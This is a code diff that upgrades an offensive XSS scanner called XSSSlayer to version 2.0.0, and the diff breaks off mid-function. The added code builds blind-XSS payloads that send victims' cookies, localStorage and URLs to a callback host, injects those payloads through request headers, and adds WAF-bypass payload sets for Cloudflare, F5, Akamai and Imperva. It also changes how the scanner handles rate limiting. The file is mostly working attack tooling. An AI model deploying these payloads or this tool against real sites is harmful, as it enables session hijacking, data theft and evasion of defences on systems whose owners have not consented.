@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════╗
-║   XSSSlayer v1.0.0 (Official Release)                        ║
+║   XSSSlayer v2.0.0 (Official Release)                        ║
 ║   High-Performance Intelligent XSS Scanner                   ║
 ║   Developed by alisalive.exe                                 ║
 ║   ig: alisalive.exe | github: alisalive                      ║
@@ -48,7 +48,7 @@ except ImportError:
 #  CONSTANTS
 # ══════════════════════════════════════════════════════════════
 console          = Console()
-VERSION          = "v1.0.0"
+VERSION          = "v2.0.0"
 SEMAPHORE_LIMIT  = 20
 PAYLOAD_FILE     = Path(__file__).parent / "payloads.txt"
 RESULTS_DIR      = Path(__file__).parent / "results"
@@ -498,6 +498,67 @@ async def apply_stealth(page) -> None:
 
 
 # ══════════════════════════════════════════════════════════════
+#  ADAPTIVE CONCURRENCY
+# ══════════════════════════════════════════════════════════════
+class AdaptiveConcurrency:
+    """
+    Drop-in replacement for asyncio.Semaphore that temporarily shrinks the
+    effective concurrency limit when many 403/429 backoffs happen in a short
+    window (a sign the target is actively rate-limiting us), then restores
+    the original limit after a cooldown period.
+    """
+    def __init__(self, limit: int, window_s: float = 20.0, threshold: int = 5,
+                 shrink_to: int | None = None, cooldown_s: float = 30.0):
+        self.limit      = limit
+        self.semaphore  = asyncio.Semaphore(limit)
+        self.window_s   = window_s
+        self.threshold  = threshold
+        self.shrink_to  = shrink_to or max(2, limit // 4)
+        self.cooldown_s = cooldown_s
+        self._events:    list[float] = []
+        self._throttled  = False
+        self._held       = 0
+        self._lock       = asyncio.Lock()
+
+    async def __aenter__(self):
+        await self.semaphore.acquire()
+        return self
+
+    async def __aexit__(self, *exc) -> None:
+        self.semaphore.release()
+
+    async def record_backoff(self) -> None:
+        """Call whenever a 403/429 is hit. Throttles concurrency if too many happen too fast."""
+        now = time.time()
+        async with self._lock:
+            self._events = [t for t in self._events if now - t < self.window_s]
+            self._events.append(now)
+            if self._throttled or len(self._events) < self.threshold:
+                return
+            self._throttled = True
+            to_hold = max(0, self.limit - self.shrink_to)
+            self._held = to_hold
+        for _ in range(to_hold):
+            await self.semaphore.acquire()
+        log_warn(
+            f"Adaptive concurrency: [bold red]{len(self._events)}[/] backoffs in "
+            f"{self.window_s:.0f}s → reducing concurrency "
+            f"[bright_yellow]{self.limit}→{self.shrink_to}[/] for {self.cooldown_s:.0f}s"
+        )
+        asyncio.ensure_future(self._restore())
+
+    async def _restore(self) -> None:
+        await asyncio.sleep(self.cooldown_s)
+        async with self._lock:
+            for _ in range(self._held):
+                self.semaphore.release()
+            self._held = 0
+            self._throttled = False
+            self._events = []
+        log_info(f"Adaptive concurrency: restored to [bright_green]{self.limit}[/] tabs.")
+
+
+# ══════════════════════════════════════════════════════════════
 #  GENERAL HELPERS
 # ══════════════════════════════════════════════════════════════
 def load_payloads() -> list[str]:
@@ -534,6 +595,15 @@ def inject_url(base: str, param: str, value: str, pre_encoded: bool = False) -> 
     qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
     qs[param] = [value]
     return parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+
+def is_target_closed_error(e: BaseException) -> bool:
+    """
+    True if `e` is Playwright's TargetClosedError (browser/page closed
+    mid-operation) — expected during a Ctrl+C interrupt, not a real error.
+    Checked by class name rather than importing the internal Playwright
+    error module, so this stays stable across Playwright versions.
+    """
+    return type(e).__name__ == "TargetClosedError"
 
 def same_origin(a: str, b: str) -> bool:
     pa, pb = urllib.parse.urlparse(a), urllib.parse.urlparse(b)
@@ -645,8 +715,83 @@ def build_blind_payloads(report_id: str) -> list[str]:
         f'<details open ontoggle="var s=document.createElement(\'script\');s.src=\'{base}\';document.head.appendChild(s)">',
         f"'\"--></style></script><script src={base}></script>",
     ]
-    log_oob(f"Generated [bold bright_red]{len(templates)}[/] Blind XSS / OOB payloads")
+
+    # Exfiltration variants — send cookies, localStorage and current URL to the
+    # callback instead of just loading a remote <script>. Useful when the OOB
+    # service only logs plain hits and you want the stolen data in the request too.
+    exfil_fetch = (
+        f"fetch('{base}?c='+encodeURIComponent(document.cookie)"
+        f"+'&l='+encodeURIComponent(JSON.stringify(localStorage))"
+        f"+'&u='+encodeURIComponent(location.href))"
+    )
+    exfil_beacon = (
+        f"new Image().src='{base}?c='+encodeURIComponent(document.cookie)"
+        f"+'&l='+encodeURIComponent(JSON.stringify(localStorage))"
+        f"+'&u='+encodeURIComponent(location.href)"
+    )
+    exfil_templates = [
+        f'"><script>{exfil_fetch}</script>',
+        f"'><script>{exfil_fetch}</script>",
+        f'<script>{exfil_fetch}</script>',
+        f'--><script>{exfil_fetch}</script>',
+        f'<img src=x onerror="{exfil_beacon}">',
+        f'<svg onload="{exfil_beacon}">',
+        f'<details open ontoggle="{exfil_beacon}">',
+    ]
+    existing = set(templates)
+    templates += [t for t in exfil_templates if t not in existing]
+
+    log_oob(
+        f"Generated [bold bright_red]{len(templates)}[/] Blind XSS / OOB payloads "
+        f"(incl. cookie/localStorage/URL exfil variants)"
+    )
     return templates
+
+
+# ══════════════════════════════════════════════════════════════
+#  FEATURE: BLIND XSS / OOB — HEADER INJECTION POINTS
+# ══════════════════════════════════════════════════════════════
+async def inject_oob_headers(ctx, url: str, blind_payloads: list[str],
+                             cookies: list | None, proxy: str | None) -> None:
+    """
+    Fire Blind XSS / OOB payloads into common header-based injection points
+    (Referer, User-Agent, X-Forwarded-For). This is blind: no response is
+    checked here — the external OOB callback service reports execution later.
+    """
+    header_names = ["Referer", "User-Agent", "X-Forwarded-For"]
+    for header_name, payload in zip(header_names, blind_payloads):
+        page = None
+        try:
+            page = await ctx.new_page()
+            await apply_stealth(page)
+
+            async def handle(route, payload=payload, header_name=header_name):
+                try:
+                    h = dict(route.request.headers)
+                    h[header_name.lower()] = payload
+                    await route.continue_(headers=h)
+                except Exception:
+                    try:
+                        await route.continue_()
+                    except Exception:
+                        pass
+
+            await page.route("**/*", handle)
+            if cookies:
+                try:
+                    await ctx.add_cookies(cookies)
+                except Exception:
+                    pass
+            await page.goto(url, timeout=NAV_TIMEOUT, wait_until="domcontentloaded")
+            log_oob(f"OOB payload sent via [bright_yellow]{header_name}[/] header.")
+        except Exception as e:
+            log_warn(f"OOB header injection ({header_name}) error: {type(e).__name__}")
+        finally:
+            if page:
+                try:
+                    await page.close()
+                except Exception:
+                    pass
 
 
 # ══════════════════════════════════════════════════════════════
@@ -770,29 +915,93 @@ def build_context_payloads(payloads: list[str], ca: ContextAnalysis) -> list[str
 # ══════════════════════════════════════════════════════════════
 #  FUZZING ENGINE
 # ══════════════════════════════════════════════════════════════
+def _extract_probe_segment(text: str, tok_a: str, tok_b: str) -> str:
+    """Return the text between tok_a and tok_b, or '' if not found in order."""
+    if not text:
+        return ""
+    pos_a, pos_b = text.find(tok_a), text.find(tok_b)
+    if pos_a == -1 or pos_b == -1 or pos_b <= pos_a:
+        return ""
+    return text[pos_a + len(tok_a): pos_b]
+
+
 async def fuzz_chars(page, url: str, param: str, nav_timeout: int) -> FuzzResult:
+    """
+    Probe which PROBE_CHARS survive injection.
+
+    NOTE: page.content() returns the browser's re-serialized DOM outerHTML,
+    which ALWAYS HTML-entity-encodes literal < and > in text nodes — even
+    when the target app performs zero sanitization. That produced false
+    "blocked" results. Instead we check the RAW HTTP response body (via a
+    page.on("response") listener), which reflects exactly what the server
+    sent. For SPA/DOM-rendered cases where the raw body won't contain the
+    reflected value (e.g. it's injected client-side after fetch/render),
+    we additionally check document.body.textContent — which, unlike
+    outerHTML, does NOT re-encode entities.
+    """
     fr    = FuzzResult()
     tok_a = gen_token(8)
     tok_b = gen_token(8)
     probe = tok_a + "".join(PROBE_CHARS) + tok_b
+    probe_url = inject_url(url, param, probe)
+
+    raw_body = ""
+
+    async def on_response(resp):
+        nonlocal raw_body
+        try:
+            if resp.request.is_navigation_request():
+                raw_body = await resp.text()
+        except Exception:
+            pass
+
+    page.on("response", on_response)
     try:
-        await page.goto(inject_url(url, param, probe), timeout=nav_timeout,
-                        wait_until="domcontentloaded")
-        raw = await page.content()
+        await page.goto(probe_url, timeout=nav_timeout, wait_until="domcontentloaded")
     except Exception as e:
+        page.remove_listener("response", on_response)
         log_warn(f"Fuzz probe error: {e}")
         fr.blocked = list(PROBE_CHARS)
         return fr
+    page.remove_listener("response", on_response)
 
-    pos_a, pos_b = raw.find(tok_a), raw.find(tok_b)
-    if pos_a == -1 or pos_b == -1:
-        log_warn("Fuzz tokens not found — assuming all chars blocked.")
+    dom_text = ""
+    try:
+        dom_text = await page.evaluate("document.body ? document.body.textContent : ''")
+    except Exception:
+        pass
+
+    raw_segment = _extract_probe_segment(raw_body, tok_a, tok_b)
+    dom_segment = _extract_probe_segment(dom_text, tok_a, tok_b)
+
+    if not raw_segment and not dom_segment:
+        log_warn("Fuzz tokens not found in raw response or DOM text — assuming all chars blocked.")
         fr.blocked = list(PROBE_CHARS)
         return fr
 
-    segment = raw[pos_a + len(tok_a) : pos_b]
+    raw_confirmed, dom_only_confirmed = [], []
     for ch in PROBE_CHARS:
-        (fr.allowed if ch in segment else fr.blocked).append(ch)
+        if ch in raw_segment:
+            fr.allowed.append(ch)
+            raw_confirmed.append(ch)
+        elif ch in dom_segment:
+            fr.allowed.append(ch)
+            dom_only_confirmed.append(ch)
+        else:
+            fr.blocked.append(ch)
+
+    log_fuzz(
+        f"Raw-response check: allowed=[green]{''.join(raw_confirmed) or 'none'}[/]"
+    )
+    if dom_only_confirmed:
+        log_fuzz(
+            f"DOM-textContent check (SPA fallback): additional allowed="
+            f"[bright_yellow]{''.join(dom_only_confirmed)}[/]"
+        )
+    log_fuzz(
+        f"Blocked (confirmed via both raw-response and DOM): "
+        f"[red]{''.join(fr.blocked) or 'none'}[/]"
+    )
     return fr
 
 
@@ -888,16 +1097,116 @@ def generate_heuristic_payloads(fuzz: FuzzResult, ctx: ContextAnalysis) -> list[
     return unique
 
 
+# ══════════════════════════════════════════════════════════════
+#  WAF-SPECIFIC BYPASS PROFILES
+# ══════════════════════════════════════════════════════════════
+def _waf_base_payloads() -> list[str]:
+    return [
+        "<svg onload=alert(1)>",
+        "<img src=x onerror=alert(1)>",
+        "<script>alert(1)</script>",
+        "<details open ontoggle=alert(1)>",
+        "<body onload=alert(1)>",
+    ]
+
+
+def _build_waf_profiles() -> dict[str, dict]:
+    base = _waf_base_payloads()
+    profiles: dict[str, dict] = {}
+
+    # Cloudflare — case randomization + comment-junk + null-byte-adjacent tricks
+    cf_payloads = []
+    for p in base:
+        cf_payloads.append(apply_case_randomizer(p))
+        cf_payloads.append(inject_comment_junk(p))
+    cf_payloads += [
+        "<svg%00/onload=alert(1)>",
+        "<img src=x\x00 onerror=alert(1)>",
+        "<sVg\t/onload=alert(1)>",
+        "<svg onload=\\u0061lert(1)>",
+    ]
+    profiles["CLOUDFLARE"] = {
+        "techniques": "case randomization + comment-junk injection + null-byte-adjacent tricks",
+        "payloads": cf_payloads,
+    }
+
+    # F5 (F5 ASM/BIG-IP) — alternate encoding + split JS identifiers + double URL-encoding
+    hex_al = hex_encode_str("alert") + "(1)"
+    uni_al = unicode_encode_str("alert") + "(1)"
+    profiles["F5"] = {
+        "techniques": "alternate encoding (hex/unicode) + split JS identifiers + double URL-encoding",
+        "payloads": [
+            f"<script>{hex_al}</script>",
+            f"<script>{uni_al}</script>",
+            f"<img src=x onerror={hex_al}>",
+            "<script>wi\\u006edow['al'+'ert'](1)</script>",
+            "<svg><script>al\\u0065rt(1)</script></svg>",
+            double_url_encode("<script>alert(1)</script>"),
+        ],
+    }
+
+    # Akamai — whitespace/tag splitting + rare event handler shuffle
+    profiles["AKAMAI"] = {
+        "techniques": "whitespace/tag splitting + rare event handler shuffle",
+        "payloads": event_handler_payloads("alert(1)")[:10] + [
+            "<svg\n onload=alert(1)>",
+            "<img\tsrc=x\tonerror=alert(1)>",
+        ],
+    }
+
+    # Imperva — base64/eval obfuscation + double URL-encoding + prototype-chain tricks
+    b64 = base64_obfuscate("alert(1)")
+    profiles["IMPERVA"] = {
+        "techniques": "base64/eval obfuscation + double URL-encoding + prototype-chain tricks",
+        "payloads": [
+            f"<script>{b64}</script>",
+            f'<img src=x onerror="{b64}">',
+            double_url_encode("<img src=x onerror=alert(1)>"),
+            "<script>[]['flat']['constructor']`${[]['flat']['constructor']`alert\\x281\\x29`}``</script>",
+        ],
+    }
+
+    # Generic fallback — any other/unrecognised detected WAF signature
+    profiles["GENERIC"] = {
+        "techniques": "case randomization + double URL-encoding (generic evasion)",
+        "payloads": [apply_case_randomizer(p) for p in base]
+                    + [double_url_encode(p) for p in base[:2]],
+    }
+    return profiles
+
+
+WAF_BYPASS_PROFILES: dict[str, dict] = _build_waf_profiles()
+
+
+def get_waf_bypass_profile(waf_name: str | None) -> tuple[str, list[str]]:
+    """Return (profile_key, payloads) for a detected WAF name, or generic fallback."""
+    if not waf_name:
+        return ("", [])
+    key = waf_name.upper()
+    if key in WAF_BYPASS_PROFILES:
+        return (key, WAF_BYPASS_PROFILES[key]["payloads"])
+    return ("GENERIC", WAF_BYPASS_PROFILES["GENERIC"]["payloads"])
+
+
 def select_smart_payloads(
     payloads:      list[str],
     fuzz:          FuzzResult,
     ca:            ContextAnalysis,
     xss_report_id: str | None = None,
     max_count:     int        = MAX_RANKED_PL,
+    waf:           str | None = None,
 ) -> list[str]:
     ai_pls  = generate_heuristic_payloads(fuzz, ca)
     ctx_pls = build_context_payloads(payloads, ca)
     oob_pls = build_blind_payloads(xss_report_id) if xss_report_id else []
+
+    waf_key, waf_pls = get_waf_bypass_profile(waf)
+    if waf_pls:
+        log_waf(
+            f"WAF bypass profile activated: [bold bright_magenta]{waf_key}[/] "
+            f"([bright_yellow]{len(waf_pls)}[/] payloads — "
+            f"{WAF_BYPASS_PROFILES[waf_key]['techniques']})"
+        )
 
     # Comment-junk variants on top 300 base payloads
     top_base = fuzz.rank_payloads(ctx_pls, limit=300)
@@ -909,22 +1218,28 @@ def select_smart_payloads(
     case_pls = [p for p in [apply_case_randomizer(x) for x in case_src]
                 if p not in set(case_src)]
 
-    combined = ai_pls + oob_pls + junk_pls + case_pls + ctx_pls
+    # Priority payloads (WAF profile first, then AI/OOB/junk/case), order-preserving dedup
+    priority_seen: set[str] = set()
+    priority_ordered: list[str] = []
+    for p in waf_pls + ai_pls + oob_pls + junk_pls + case_pls:
+        if p not in priority_seen:
+            priority_seen.add(p); priority_ordered.append(p)
+
+    combined = priority_ordered + ctx_pls
     seen: set[str] = set()
     deduped = []
     for p in combined:
         if p not in seen:
             seen.add(p); deduped.append(p)
 
-    priority_set = set(ai_pls + oob_pls + junk_pls + case_pls)
-    ranked = fuzz.rank_payloads([p for p in deduped if p not in priority_set], limit=max_count)
+    ranked = fuzz.rank_payloads([p for p in deduped if p not in priority_seen], limit=max_count)
 
     log_ai(
-        f"Final list: [bold bright_yellow]{len(list(priority_set)+ranked)}[/] "
-        f"(AI={len(ai_pls)} OOB={len(oob_pls)} junk={len(junk_pls)} "
+        f"Final list: [bold bright_yellow]{len(priority_ordered) + len(ranked)}[/] "
+        f"(WAF={len(waf_pls)} AI={len(ai_pls)} OOB={len(oob_pls)} junk={len(junk_pls)} "
         f"case={len(case_pls)} ranked={len(ranked)})"
     )
-    return list(priority_set) + ranked
+    return priority_ordered + ranked
 
 
 # ══════════════════════════════════════════════════════════════
@@ -1231,11 +1546,23 @@ async def auto_discover(ctx, base_url: str, max_pages: int,
 # ══════════════════════════════════════════════════════════════
 #  SINGLE PAYLOAD TEST
 # ══════════════════════════════════════════════════════════════
+async def poll_until_dialog(check_fn, timeout_ms: int, poll_interval_ms: int = 100) -> None:
+    """
+    Poll in small increments instead of a flat sleep, exiting the moment
+    check_fn() returns True (dialog already fired). Avoids wasting the full
+    DIALOG_TIMEOUT on every single payload when most don't trigger anything.
+    """
+    elapsed_ms = 0
+    while elapsed_ms < timeout_ms and not check_fn():
+        await asyncio.sleep(poll_interval_ms / 1000)
+        elapsed_ms += poll_interval_ms
+
+
 async def test_payload(
     ctx,
     target:          ScanTarget,
     payload:         str,
-    semaphore:       asyncio.Semaphore,
+    semaphore:       AdaptiveConcurrency,
     results:         list,
     progress,
     task_id,
@@ -1246,6 +1573,9 @@ async def test_payload(
     take_screenshot: bool  = False,
     cookies:         list  = None,
     proxy:           str   = None,
+    dialog_timeout:  int   = DIALOG_TIMEOUT,
+    retry_delay:     int   = RATE_LIMIT_DELAY,
+    background_tasks: list = None,
 ) -> None:
     async with semaphore:
         page = None
@@ -1287,7 +1617,7 @@ async def test_payload(
                         }""",
                         {"url": target.url, "body": body},
                     )
-                    await asyncio.sleep(DIALOG_TIMEOUT / 1000)
+                    await poll_until_dialog(lambda: dialog_triggered, dialog_timeout)
                     await human_interact(page)
                 except Exception:
                     pass
@@ -1303,9 +1633,10 @@ async def test_payload(
                         status = resp.status if resp else 0
                         if status in (403, 429):
                             retries += 1
-                            log_warn(f"Status [bold red]{status}[/] → backoff {RATE_LIMIT_DELAY}s "
+                            await semaphore.record_backoff()
+                            log_warn(f"Status [bold red]{status}[/] → backoff {retry_delay}s "
                                      f"(retry {retries}/{MAX_RETRIES})")
-                            await asyncio.sleep(RATE_LIMIT_DELAY)
+                            await asyncio.sleep(retry_delay)
                             ua, ip = rand_ua(), rand_ip()
                             await setup_page_bypass(page, ua, ip)
                             continue
@@ -1314,7 +1645,7 @@ async def test_payload(
                         break
 
                 await human_interact(page)
-                await asyncio.sleep(DIALOG_TIMEOUT / 1000)
+                await poll_until_dialog(lambda: dialog_triggered, dialog_timeout)
 
             if dialog_triggered:
                 final_url = inject_url(target.url, target.param, encoded, pre_encoded=True)
@@ -1342,10 +1673,17 @@ async def test_payload(
                     entry["screenshot"] = await take_poc_screenshot(page, entry)
                 results.append(entry)
                 if show_browser:
-                    asyncio.create_task(replay_poc_visible(entry["url"], cookies or [], proxy))
+                    replay_task = asyncio.ensure_future(
+                        replay_poc_visible(entry["url"], cookies or [], proxy)
+                    )
+                    if background_tasks is not None:
+                        background_tasks.append(replay_task)
 
         except Exception as e:
-            log_warn(f"test_payload error ({target.param}): {type(e).__name__}")
+            if is_target_closed_error(e):
+                log_warn(f"test_payload ({target.param}): browser closed (expected on interrupt).")
+            else:
+                log_warn(f"test_payload error ({target.param}): {type(e).__name__}")
         finally:
             if page:
                 try:
@@ -1362,7 +1700,7 @@ async def scan_one_target(
     ctx,
     target:          ScanTarget,
     payloads:        list[str],
-    semaphore:       asyncio.Semaphore,
+    semaphore:       AdaptiveConcurrency,
     results:         list,
     progress,
     task_id,
@@ -1374,6 +1712,10 @@ async def scan_one_target(
     cookies:         list  = None,
     proxy:           str   = None,
     xss_report_id:   str   = None,
+    dialog_timeout:  int   = DIALOG_TIMEOUT,
+    retry_delay:     int   = RATE_LIMIT_DELAY,
+    background_tasks: list = None,
+    waf:             str   = None,
 ) -> None:
     console.print()
     console.print(Rule(f"[bold bright_cyan] {target.label} [/]", style="bright_cyan"))
@@ -1404,18 +1746,31 @@ async def scan_one_target(
             except Exception:
                 pass
 
-    smart = select_smart_payloads(payloads, fr, ca, xss_report_id=xss_report_id)
+    smart = select_smart_payloads(payloads, fr, ca, xss_report_id=xss_report_id, waf=waf)
     log_info(f"Payload list: [bright_yellow]{len(smart)}[/] ready")
     progress.update(task_id, total=len(smart))
 
-    tasks = [
-        test_payload(ctx, target, pl, semaphore, results, progress, task_id,
-                     nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
-                     show_browser=show_browser, take_screenshot=take_screenshot,
-                     cookies=cookies, proxy=proxy)
+    task_objs = [
+        asyncio.ensure_future(
+            test_payload(ctx, target, pl, semaphore, results, progress, task_id,
+                         nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
+                         show_browser=show_browser, take_screenshot=take_screenshot,
+                         cookies=cookies, proxy=proxy,
+                         dialog_timeout=dialog_timeout, retry_delay=retry_delay,
+                         background_tasks=background_tasks)
+        )
         for pl in smart
     ]
-    await asyncio.gather(*tasks)
+    try:
+        await asyncio.gather(*task_objs, return_exceptions=True)
+    except asyncio.CancelledError:
+        pending = [t for t in task_objs if not t.done()]
+        for t in pending:
+            t.cancel()
+        if pending:
+            await asyncio.gather(*pending, return_exceptions=True)
+        log_warn(f"Cancelled [bold yellow]{len(pending)}[/] in-flight requests.")
+        raise
 
 
 # ══════════════════════════════════════════════════════════════
@@ -1555,8 +1910,23 @@ async def run_scan(args) -> None:
     no_mine         = args.no_mine
     cookie_str      = args.cookie
     xss_report_id   = args.xss_report
+    oob_context     = args.oob_context
     proxy           = args.proxy
+    retry_delay     = args.retry_delay
     auto_mode       = (param is None)
+    dialog_timeout  = DIALOG_TIMEOUT
+
+    # ── --fast mode: trade some delayed-dialog detection for raw speed ──
+    if args.fast:
+        dialog_timeout = 1200
+        if args.jitter == [JITTER_MIN, JITTER_MAX]:      # user didn't override jitter
+            jitter_min, jitter_max = 0.02, 0.08
+        if args.concurrency == SEMAPHORE_LIMIT:          # user didn't override concurrency
+            concurrency = 40
+        log_bypass(
+            f"[bold bright_yellow]--fast mode[/] enabled: "
+            f"dialog_timeout=1200ms, jitter={jitter_min}-{jitter_max}s, concurrency={concurrency}"
+        )
 
     # Parse cookies
     session_cookies: list[dict] = []
@@ -1575,6 +1945,7 @@ async def run_scan(args) -> None:
     log_info(f"Concurrency     : [bright_green]{concurrency}[/] tabs")
     log_info(f"Timeout         : [bright_green]{args.timeout}s[/]")
     log_info(f"Jitter          : [bright_green]{jitter_min}–{jitter_max}s[/]")
+    log_info(f"Retry delay     : [bright_green]{retry_delay}s[/] (on 403/429 backoff)")
     if proxy:
         log_info(f"Proxy           : [bright_cyan]{proxy}[/]")
     if take_screenshot:
@@ -1596,8 +1967,11 @@ async def run_scan(args) -> None:
     console.print()
 
     payloads  = load_payloads()
-    semaphore = asyncio.Semaphore(concurrency)
+    semaphore = AdaptiveConcurrency(concurrency)
     results:  list = []
+    background_tasks: list = []
+    targets:  list[ScanTarget] = []
+    start = time.time()
 
     launch_opts: dict = {"headless": True, "args": ["--no-sandbox", "--disable-setuid-sandbox"]}
     if proxy:
@@ -1607,101 +1981,128 @@ async def run_scan(args) -> None:
         browser = await pw.chromium.launch(**launch_opts)
         ctx     = await browser.new_context(ignore_https_errors=True)
 
-        if session_cookies:
-            await ctx.add_cookies(session_cookies)
+        try:
+            if session_cookies:
+                await ctx.add_cookies(session_cookies)
 
-        # ── Step 1: WAF Detection ──────────────────────────────
-        log_info("[bold]Step 1[/] — WAF Detection ...")
-        wp = await ctx.new_page()
-        await apply_stealth(wp)
-        await setup_page_bypass(wp, rand_ua(), rand_ip())
-        waf = await detect_waf(wp, url)
-        await wp.close()
-        if waf:
-            log_waf(f"[bold red]WAF Detected:[/] [bright_magenta]{waf}[/]")
-        else:
-            log_info("No WAF signature detected.")
-        console.print()
-
-        # ── Step 2: Target Discovery ───────────────────────────
-        if auto_mode:
-            log_info("[bold]Step 2[/] — Crawl + Form Discovery + Param Mining ...")
-            targets = await auto_discover(ctx, url, max_pages, nav_timeout, mine=not no_mine)
-            if not targets:
-                log_error("No injectable targets found. Exiting.")
-                await browser.close()
-                return
-        else:
-            targets = [ScanTarget(url=url, param=param, source_page=url)]
-            if not no_mine:
-                log_info("[bold]Step 2[/] — Param Mining ...")
-                mp = await ctx.new_page()
-                try:
-                    await apply_stealth(mp)
-                    await setup_page_bypass(mp, rand_ua(), rand_ip())
-                    extra = await mine_params(mp, url, nav_timeout)
-                except Exception:
-                    extra = []
-                finally:
-                    await mp.close()
-                exist = {(t.url, t.param) for t in targets}
-                for t in extra:
-                    if (t.url, t.param) not in exist:
-                        targets.append(t); exist.add((t.url, t.param))
-                if extra:
-                    log_mine(f"[bright_green]{len(extra)}[/] extra parameters found.")
-                console.print()
-
-        # ── Step 3: Payload Scan ───────────────────────────────
-        step = "3" if (auto_mode or not no_mine) else "2"
-        log_info(
-            f"[bold]Step {step}[/] — God Mode Scan: "
-            f"[bright_yellow]{len(payloads)}[/] base payloads × "
-            f"[bright_green]{len(targets)}[/] target(s)"
-        )
-        console.print()
-        start = time.time()
-
-        with Progress(
-            SpinnerColumn(spinner_name="dots", style="bright_cyan"),
-            TextColumn("[bold bright_cyan]{task.description}"),
-            BarColumn(bar_width=36, style="bright_magenta", complete_style="bright_green"),
-            TaskProgressColumn(),
-            TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
-            TimeElapsedColumn(),
-            console=console, transient=False,
-        ) as prog:
-            for ti, target in enumerate(targets, 1):
-                short = target.source_page.split("?")[0][-28:]
-                tid   = prog.add_task(f"[{ti}/{len(targets)}] {short} → {target.param}",
-                                      total=len(payloads))
-                await scan_one_target(
-                    ctx, target, payloads, semaphore, results, prog, tid,
-                    nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
-                    show_browser=show_browser, take_screenshot=take_screenshot,
-                    cookies=session_cookies, proxy=proxy, xss_report_id=xss_report_id,
-                )
-
-            # ── Step 4: DOM XSS (URL fragment scan) ───────────
+            # ── Step 1: WAF Detection ──────────────────────────────
+            log_info("[bold]Step 1[/] — WAF Detection ...")
+            wp = await ctx.new_page()
+            await apply_stealth(wp)
+            await setup_page_bypass(wp, rand_ua(), rand_ip())
+            waf = await detect_waf(wp, url)
+            await wp.close()
+            if waf:
+                log_waf(f"[bold red]WAF Detected:[/] [bright_magenta]{waf}[/]")
+            else:
+                log_info("No WAF signature detected.")
             console.print()
-            log_info(f"[bold]Step {int(step)+1}[/] — DOM / SPA XSS (URL fragment scan) ...")
-            dom_page = await ctx.new_page()
-            try:
-                await apply_stealth(dom_page)
-                await setup_page_bypass(dom_page, rand_ua(), rand_ip())
-                dom_findings = await check_dom_xss(
-                    dom_page, url, payloads, nav_timeout, jitter_min, jitter_max
-                )
-                for df in dom_findings:
-                    if take_screenshot:
-                        df["screenshot"] = await take_poc_screenshot(dom_page, df)
-                    results.append(df)
-            except Exception as e:
-                log_warn(f"DOM XSS scan error: {e}")
-            finally:
-                await dom_page.close()
 
-        await browser.close()
+            # ── Step 1b: Blind XSS / OOB header injection ──────────
+            if oob_context:
+                if xss_report_id:
+                    log_oob("[bold]--oob-context[/] — injecting Blind XSS/OOB into headers ...")
+                    blind_pls = build_blind_payloads(xss_report_id)
+                    await inject_oob_headers(ctx, url, blind_pls, session_cookies, proxy)
+                    console.print()
+                else:
+                    log_warn("--oob-context requires --xss-report ID — skipping header injection.")
+
+            # ── Step 2: Target Discovery ───────────────────────────
+            if auto_mode:
+                log_info("[bold]Step 2[/] — Crawl + Form Discovery + Param Mining ...")
+                targets = await auto_discover(ctx, url, max_pages, nav_timeout, mine=not no_mine)
+                if not targets:
+                    log_error("No injectable targets found. Exiting.")
+                    return
+            else:
+                targets = [ScanTarget(url=url, param=param, source_page=url)]
+                if not no_mine:
+                    log_info("[bold]Step 2[/] — Param Mining ...")
+                    mp = await ctx.new_page()
+                    try:
+                        await apply_stealth(mp)
+                        await setup_page_bypass(mp, rand_ua(), rand_ip())
+                        extra = await mine_params(mp, url, nav_timeout)
+                    except Exception:
+                        extra = []
+                    finally:
+                        await mp.close()
+                    exist = {(t.url, t.param) for t in targets}
+                    for t in extra:
+                        if (t.url, t.param) not in exist:
+                            targets.append(t); exist.add((t.url, t.param))
+                    if extra:
+                        log_mine(f"[bright_green]{len(extra)}[/] extra parameters found.")
+                    console.print()
+
+            # ── Step 3: Payload Scan ───────────────────────────────
+            step = "3" if (auto_mode or not no_mine) else "2"
+            log_info(
+                f"[bold]Step {step}[/] — God Mode Scan: "
+                f"[bright_yellow]{len(payloads)}[/] base payloads × "
+                f"[bright_green]{len(targets)}[/] target(s)"
+            )
+            console.print()
+            start = time.time()
+
+            with Progress(
+                SpinnerColumn(spinner_name="dots", style="bright_cyan"),
+                TextColumn("[bold bright_cyan]{task.description}"),
+                BarColumn(bar_width=36, style="bright_magenta", complete_style="bright_green"),
+                TaskProgressColumn(),
+                TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
+                TimeElapsedColumn(),
+                console=console, transient=False,
+            ) as prog:
+                for ti, target in enumerate(targets, 1):
+                    short = target.source_page.split("?")[0][-28:]
+                    tid   = prog.add_task(f"[{ti}/{len(targets)}] {short} → {target.param}",
+                                          total=len(payloads))
+                    await scan_one_target(
+                        ctx, target, payloads, semaphore, results, prog, tid,
+                        nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
+                        show_browser=show_browser, take_screenshot=take_screenshot,
+                        cookies=session_cookies, proxy=proxy, xss_report_id=xss_report_id,
+                        dialog_timeout=dialog_timeout, background_tasks=background_tasks,
+                        waf=waf, retry_delay=retry_delay,
+                    )
+
+                # ── Step 4: DOM XSS (URL fragment scan) ───────────
+                console.print()
+                log_info(f"[bold]Step {int(step)+1}[/] — DOM / SPA XSS (URL fragment scan) ...")
+                dom_page = await ctx.new_page()
+                try:
+                    await apply_stealth(dom_page)
+                    await setup_page_bypass(dom_page, rand_ua(), rand_ip())
+                    dom_findings = await check_dom_xss(
+                        dom_page, url, payloads, nav_timeout, jitter_min, jitter_max
+                    )
+                    for df in dom_findings:
+                        if take_screenshot:
+                            df["screenshot"] = await take_poc_screenshot(dom_page, df)
+                        results.append(df)
+                except Exception as e:
+                    log_warn(f"DOM XSS scan error: {e}")
+                finally:
+                    await dom_page.close()
+
+        except asyncio.CancelledError:
+            log_warn(
+                "[bold yellow]Scan interrupted[/] — cancelling in-flight requests "
+                "and closing browser gracefully ..."
+            )
+            raise
+        finally:
+            if background_tasks:
+                for t in background_tasks:
+                    if not t.done():
+                        t.cancel()
+                await asyncio.gather(*background_tasks, return_exceptions=True)
+            try:
+                await asyncio.wait_for(browser.close(), timeout=5)
